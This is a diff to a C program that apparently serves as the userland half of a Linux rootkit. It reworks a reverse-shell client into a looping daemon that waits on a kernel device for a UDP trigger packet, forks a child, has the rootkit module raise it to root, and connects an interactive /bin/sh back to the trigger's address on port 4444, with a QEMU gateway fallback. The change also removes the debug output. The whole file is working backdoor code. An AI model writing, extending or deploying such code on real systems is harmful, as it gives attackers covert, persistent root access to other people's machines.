@@ -12,88 +12,89 @@
 #include "interface.h"
 
 int main(void) {
+    /* Prevent terminated shell children from becoming zombies */
     signal(SIGCHLD, SIG_IGN);
-
-    printf("[revshell] Started. Attempting to open /dev/%s...\n", rootkit_DEV_NAME);
-    fflush(stdout);
 
     int dev_fd = open("/dev/" rootkit_DEV_NAME, O_RDWR);
     if (dev_fd < 0) {
-        perror("[revshell] ERROR: Failed to open /dev/" rootkit_DEV_NAME);
+        perror("open /dev/" rootkit_DEV_NAME);
         return 1;
     }
 
-    printf("[revshell] Device /dev/%s opened successfully (fd=%d).\n", rootkit_DEV_NAME, dev_fd);
-    printf("[revshell] Waiting in kernel space for UDP trigger (rootkit_IOCTL_WAIT_REMOTE)...\n");
-    fflush(stdout);
+    /* Daemon loop: handles multiple triggers indefinitely */
+    while (1) {
+        struct in_addr remote_ip;
+        memset(&remote_ip, 0, sizeof(remote_ip));
 
-    struct in_addr remote_ip;
-    memset(&remote_ip, 0, sizeof(remote_ip));
+        /* Wait in kernel space until UDP trigger packet arrives */
+        if (ioctl(dev_fd, rootkit_IOCTL_WAIT_REMOTE, &remote_ip) < 0) {
+            sleep(1);
+            continue;
+        }
 
-    /* Wait in kernel space until UDP trigger packet arrives */
-    if (ioctl(dev_fd, rootkit_IOCTL_WAIT_REMOTE, &remote_ip) < 0) {
-        perror("[revshell] ERROR: ioctl rootkit_IOCTL_WAIT_REMOTE failed");
-        close(dev_fd);
-        return 1;
+        pid_t pid = fork();
+        if (pid < 0) {
+            continue;
+        }
+
+        if (pid == 0) {
+            /* ================= CHILD PROCESS ================= */
+            /* Elevate child process credentials to root */
+            if (ioctl(dev_fd, rootkit_IOCTL_ELEVATE, 0) < 0) {
+                perror("ioctl rootkit_IOCTL_ELEVATE");
+                close(dev_fd);
+                exit(1);
+            }
+            close(dev_fd);
+
+            /* If trigger came from QEMU host forwarder (0.0.0.0), resolve to host gateway */
+            if (remote_ip.s_addr == INADDR_ANY) {
+                FILE *f = fopen("/etc/rootkit_remote_ip", "r");
+                if (f != NULL) {
+                    char ip_str[64];
+                    if (fgets(ip_str, sizeof(ip_str), f) != NULL) {
+                        char *nl = strchr(ip_str, '\n');
+                        if (nl) *nl = '\0';
+                        inet_pton(AF_INET, ip_str, &remote_ip);
+                    }
+                    fclose(f);
+                }
+                /* Default fallback for QEMU host */
+                if (remote_ip.s_addr == INADDR_ANY) {
+                    inet_pton(AF_INET, "10.0.2.2", &remote_ip);
+                }
+            }
+
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock < 0) exit(1);
+
+            struct sockaddr_in sa;
+            memset(&sa, 0, sizeof(sa));
+            sa.sin_family = AF_INET;
+            sa.sin_port = htons(4444);
+            sa.sin_addr = remote_ip;
+
+            if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+                close(sock);
+                exit(1);
+            }
+
+            dup2(sock, 0);
+            dup2(sock, 1);
+            dup2(sock, 2);
+
+            char *argv[] = { "/bin/sh", "-i", NULL };
+            char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", "TERM=xterm", NULL };
+            execve("/bin/sh", argv, envp);
+
+            close(sock);
+            exit(0);
+        }
+
+        /* ================= PARENT PROCESS ================= */
+        /* Loops back to wait for the next trigger packet */
     }
-
-    char ip_str[INET_ADDRSTRLEN];
-    if (inet_ntop(AF_INET, &remote_ip, ip_str, sizeof(ip_str)) == NULL) {
-        strncpy(ip_str, "0.0.0.0", sizeof(ip_str));
-    }
-
-    printf("[revshell] TRIGGER RECEIVED! Remote IP: %s\n", ip_str);
-    printf("[revshell] Requesting root privilege elevation (rootkit_IOCTL_ELEVATE)...\n");
-    fflush(stdout);
-
-    /* Elevate credentials to root (UID 0, GID 0) */
-    if (ioctl(dev_fd, rootkit_IOCTL_ELEVATE, 0) < 0) {
-        perror("[revshell] ERROR: ioctl rootkit_IOCTL_ELEVATE failed");
-        close(dev_fd);
-        return 1;
-    }
-
-    printf("[revshell] Credentials elevated successfully (UID=%d, EUID=%d).\n", getuid(), geteuid());
-    printf("[revshell] Creating TCP socket...\n");
-    fflush(stdout);
 
     close(dev_fd);
-
-    /* Connect reverse TCP shell back to $REMOTE:4444 */
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) {
-        perror("[revshell] ERROR: Failed to create TCP socket");
-        return 1;
-    }
-
-    struct sockaddr_in sa;
-    memset(&sa, 0, sizeof(sa));
-    sa.sin_family = AF_INET;
-    sa.sin_port = htons(4444);
-    sa.sin_addr = remote_ip;
-
-    printf("[revshell] Connecting to %s:4444...\n", ip_str);
-    fflush(stdout);
-
-    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
-        perror("[revshell] ERROR: Failed to connect to remote IP");
-        close(sock);
-        return 1;
-    }
-
-    printf("[revshell] Connected to %s:4444! Redirecting stdio and spawning /bin/sh...\n", ip_str);
-    fflush(stdout);
-
-    /* Redirect stdin, stdout, stderr to networootkit socket */
-    dup2(sock, 0);
-    dup2(sock, 1);
-    dup2(sock, 2);
-
-    char *argv[] = { "/bin/sh", "-i", NULL };
-    char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", "TERM=xterm", NULL };
-    execve("/bin/sh", argv, envp);
-
-    /* If execve fails, print error */
-    perror("[revshell] ERROR: execve failed");
-    return 1;
+    return 0;
 }
